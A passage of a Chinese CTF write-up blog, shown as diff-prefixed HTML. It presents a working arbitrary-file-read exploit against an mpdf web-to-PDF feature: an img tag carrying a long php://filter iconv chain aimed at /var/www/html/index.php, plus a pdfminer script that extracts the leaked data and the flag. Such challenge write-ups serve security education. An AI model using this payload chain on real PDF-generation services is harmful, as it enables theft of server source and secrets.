+<span class="nv">final_payload</span> <span class="o">=</span> f<span class="s2">&#34;php://filter/{filters}/resource={file_to_use}&#34;</span>
+
+with open<span class="o">(</span><span class="s1">&#39;exp-web2pdf.html&#39;</span>, <span class="s1">&#39;w&#39;</span><span class="o">)</span> as f:
+    f.write<span class="o">(</span>f<span class="s1">&#39;&lt;h1&gt;exploit&lt;/h1&gt;&lt;img src=&#34;././{final_payload}&#34; ORIG_SRC=&#34;x&#34;&gt;&#39;</span><span class="o">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>得到exp</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">&lt;h1&gt;exploit&lt;/h1&gt;&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&#34;././php://filter/convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.iconv.ISO6937.EUC-JP-MS|convert.iconv.EUCKR.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/var/www/html/index.php&#34;</span> <span class="nv">ORIG_SRC</span><span class="o">=</span><span class="s2">&#34;x&#34;</span>&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p>vps上放好html代码，然后发送生成pdf</p>
+<p>pdf中的图片有两种情况，第一种是原始数据，第二种是压缩了的情况</p>
+<p>原始数据是可以直接拖出来的，可以看到这个例子是有正常的jpg文件头</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221128132516873.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221128132516873"
+	
+	
+></p>
+<p>但是这个pdf下来，是不能直接拿到图片，他的图片是经过压缩了的</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221128132552365.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221128132552365"
+	
+	
+></p>
+<p>所以我们得用pdf的解码器，去把内容解码出来，而python有一个库实现了这个功能，pdfminer</p>
+<p>这里用这个脚本就可以做到了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pdfminer.pdfdocument</span> <span class="kn">import</span> <span class="n">PDFDocument</span>
+<span class="kn">from</span> <span class="nn">pdfminer.pdfparser</span> <span class="kn">import</span> <span class="n">PDFParser</span>
+<span class="kn">from</span> <span class="nn">pdfminer.pdfinterp</span> <span class="kn">import</span> <span class="n">PDFResourceManager</span><span class="p">,</span> <span class="n">PDFPageInterpreter</span>
+<span class="kn">from</span> <span class="nn">pdfminer.converter</span> <span class="kn">import</span> <span class="n">TextConverter</span>
+<span class="kn">from</span> <span class="nn">pdfminer.layout</span> <span class="kn">import</span> <span class="n">LAParams</span>
+<span class="kn">from</span> <span class="nn">pdfminer.pdfpage</span> <span class="kn">import</span> <span class="n">PDFPage</span>
+<span class="kn">from</span> <span class="nn">pdfminer.converter</span> <span class="kn">import</span> <span class="n">PDFPageAggregator</span>
+<span class="kn">from</span> <span class="nn">pdfminer.layout</span> <span class="kn">import</span> <span class="o">*</span>
+ 
+<span class="c1">#打开一个pdf，使用二进制读取文件，读进来的是bytes类型</span>
+<span class="n">pdf0</span><span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;mpdf.pdf&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span>
+<span class="c1">#创建一个PDFParser对象</span>
+<span class="n">parser</span><span class="o">=</span><span class="n">PDFParser</span><span class="p">(</span><span class="n">pdf0</span><span class="p">)</span>
+<span class="c1">#这里可以输入文档密码，官方是doc=PDFDocument(parser,password),我没有密码，就没输入</span>
+<span class="n">doc</span><span class="o">=</span><span class="n">PDFDocument</span><span class="p">(</span><span class="n">parser</span><span class="p">)</span> 
+<span class="n">parser</span><span class="o">.</span><span class="n">set_document</span><span class="p">(</span><span class="n">doc</span><span class="p">)</span> 
+ 
+<span class="c1">#这四行代码的目的就是初始化一个interpreter ，用于后面解析页面</span>
+<span class="c1">#pdf资源管理器</span>
+<span class="n">resources</span> <span class="o">=</span> <span class="n">PDFResourceManager</span><span class="p">()</span> 
+<span class="c1">#参数分析器</span>
+<span class="n">laparam</span><span class="o">=</span><span class="n">LAParams</span><span class="p">()</span>
+<span class="c1">#聚合器</span>
+<span class="n">device</span><span class="o">=</span><span class="n">PDFPageAggregator</span><span class="p">(</span><span class="n">resources</span><span class="p">,</span><span class="n">laparams</span><span class="o">=</span><span class="n">laparam</span><span class="p">)</span>
+<span class="c1">#页面解释器</span>
+<span class="n">interpreter</span> <span class="o">=</span> <span class="n">PDFPageInterpreter</span><span class="p">(</span><span class="n">resources</span><span class="p">,</span><span class="n">device</span><span class="p">)</span> 
+ 
+<span class="c1">#这里可以拆开获取pdf的每一页</span>
+<span class="c1">#PDFPage.create_pages(doc)的返回值是generator类型，可以用for来遍历</span>
+<span class="n">pages</span><span class="o">=</span><span class="p">[]</span>
+<span class="k">for</span> <span class="n">page</span> <span class="ow">in</span> <span class="n">PDFPage</span><span class="o">.</span><span class="n">create_pages</span><span class="p">(</span><span class="n">doc</span><span class="p">):</span>
+    <span class="n">pages</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">page</span><span class="p">)</span>
+
+<span class="c1">#准备把page解析出来的东西存一下，方便后面用</span>
+<span class="n">texts</span><span class="o">=</span><span class="p">[]</span>
+<span class="n">images</span><span class="o">=</span><span class="p">[]</span>
+ 
+<span class="k">for</span> <span class="n">page</span> <span class="ow">in</span> <span class="n">pages</span><span class="p">:</span>
+    <span class="n">interpreter</span><span class="o">.</span><span class="n">process_page</span><span class="p">(</span><span class="n">page</span><span class="p">)</span><span class="c1">#解析page</span>
+    <span class="n">layout</span> <span class="o">=</span> <span class="n">device</span><span class="o">.</span><span class="n">get_result</span><span class="p">()</span> <span class="c1">#获得layout，layout可遍历</span>
+ 
+    <span class="c1">#遍历layout，layout里面就是要拆的东西了</span>
+    <span class="k">for</span> <span class="n">out</span> <span class="ow">in</span> <span class="n">layout</span><span class="p">:</span>
+        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">LTTextBox</span><span class="p">):</span>
+            <span class="n">texts</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
+        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">LTImage</span><span class="p">):</span>
+            <span class="n">images</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
+        <span class="c1">#当是figure类型时，需要取出它里面的东西来。figure可遍历，所以for循环取。</span>
+        <span class="c1">#如果figure里面还是figure，就接着遍历(虽然我没见过多层figure的情况)</span>
+        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">LTFigure</span><span class="p">):</span>
+            <span class="n">figurestack</span><span class="o">=</span><span class="p">[</span><span class="n">out</span><span class="p">]</span>
+            <span class="k">while</span> <span class="n">figurestack</span><span class="p">:</span>
+                <span class="n">figure</span><span class="o">=</span><span class="n">figurestack</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span>
+                <span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">figure</span><span class="p">:</span>
+                    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">f</span><span class="p">,</span><span class="n">LTTextBox</span><span class="p">):</span>
+                        <span class="n">texts</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+                    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">f</span><span class="p">,</span><span class="n">LTImage</span><span class="p">):</span>
+                        <span class="n">images</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+                    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">f</span><span class="p">,</span><span class="n">LTFigure</span><span class="p">):</span>
+                        <span class="n">figurestack</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+<span class="c1">#文本：</span>
+<span class="k">for</span> <span class="n">text</span> <span class="ow">in</span> <span class="n">texts</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">text</span><span class="o">.</span><span class="n">get_text</span><span class="p">())</span>
+ 
+<span class="c1">#图片及图片另存：</span>
+<span class="n">i</span><span class="o">=</span><span class="mi">0</span> <span class="c1">#文件名编号</span>
+<span class="k">for</span> <span class="n">image</span> <span class="ow">in</span> <span class="n">images</span><span class="p">:</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;pic.bmp&#39;</span><span class="p">,</span><span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">image</span><span class="o">.</span><span class="n">stream</span><span class="o">.</span><span class="n">get_data</span><span class="p">())</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>最后获得解码的内容，拿到flag</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221128132712562.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221128132712562"
+	
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/post/xyb2022/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[2022祥云杯] wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/qwb2022/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[2022强网杯] WP</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/typhoonconctf2022/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[TyphoonCon CTF 2022] WP</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/ciscn2022_half/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[CISCN2022] Semifinals</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/ciscn2022_crt/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[CISCN2022] online_crt</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 Huamang
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        <span id="busuanzi_container_page_pv"> 阅读量 <span id="busuanzi_value_page_pv"></span> 次 </span>
+        <br>
+        
+        <span class="icp"><a href="https://beian.miit.gov.cn/" target="_blank">赣ICP备2021001334号</a></span>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+    </body>
+</html>
